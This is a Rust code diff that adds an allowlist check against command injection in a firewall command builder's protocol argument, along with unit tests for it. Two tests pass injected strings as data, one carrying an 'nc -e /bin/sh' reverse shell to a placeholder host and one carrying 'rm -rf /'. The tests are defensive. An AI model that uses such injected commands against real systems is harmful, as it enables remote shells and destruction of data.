@@ -78,6 +78,14 @@ pub fn validate_port(port: &str) -> Result<()> {
     })
 }
 
+fn validate_protocol(p: &str) -> Result<()> {
+    matches!(p, "tcp" | "udp" | "icmp" | "icmpv6")
+        .then_some(())
+        .ok_or_else(|| BridgeError::CommandDenied {
+            reason: format!("Invalid firewall protocol '{p}'. Allowed: tcp|udp|icmp|icmpv6"),
+        })
+}
+
 /// Validate that a source address looks like a valid IP or CIDR.
 ///
 /// # Errors
@@ -166,6 +174,9 @@ impl FirewallCommandBuilder {
         source: Option<&str>,
     ) -> Result<String> {
         validate_port(port)?;
+        if let Some(p) = protocol {
+            validate_protocol(p)?;
+        }
         if let Some(src) = source {
             validate_source(src)?;
         }
@@ -238,6 +249,9 @@ impl FirewallCommandBuilder {
         source: Option<&str>,
     ) -> Result<String> {
         validate_port(port)?;
+        if let Some(p) = protocol {
+            validate_protocol(p)?;
+        }
         if let Some(src) = source {
             validate_source(src)?;
         }
@@ -627,5 +641,43 @@ mod tests {
     #[test]
     fn test_validate_port_service_with_hyphens() {
         assert!(validate_port("my-custom-service").is_ok());
+    }
+
+    // ============== Protocol Injection Prevention (Vuln 7) ==============
+
+    #[test]
+    fn test_allow_rejects_protocol_injection() {
+        let r = FirewallCommandBuilder::build_allow_command(
+            None,
+            "80",
+            Some("tcp -j ACCEPT; nc -e /bin/sh evil 9; iptables -A INPUT -p tcp"),
+            None,
+        );
+        assert!(r.is_err(), "must reject injection in protocol");
+    }
+
+    #[test]
+    fn test_deny_rejects_protocol_injection() {
+        let r = FirewallCommandBuilder::build_deny_command(
+            None,
+            "80",
+            Some("udp; rm -rf /"),
+            None,
+        );
+        assert!(r.is_err());
+    }
+
+    #[test]
+    fn test_allow_accepts_known_protocols() {
+        for p in ["tcp", "udp", "icmp", "icmpv6"] {
+            let r = FirewallCommandBuilder::build_allow_command(Some("ufw"), "80", Some(p), None);
+            assert!(r.is_ok(), "{p} should be accepted");
+        }
+    }
+
+    #[test]
+    fn test_allow_rejects_unknown_protocol() {
+        let r = FirewallCommandBuilder::build_allow_command(Some("ufw"), "80", Some("sctp"), None);
+        assert!(r.is_err(), "sctp is not in the allowlist");
     }
 }
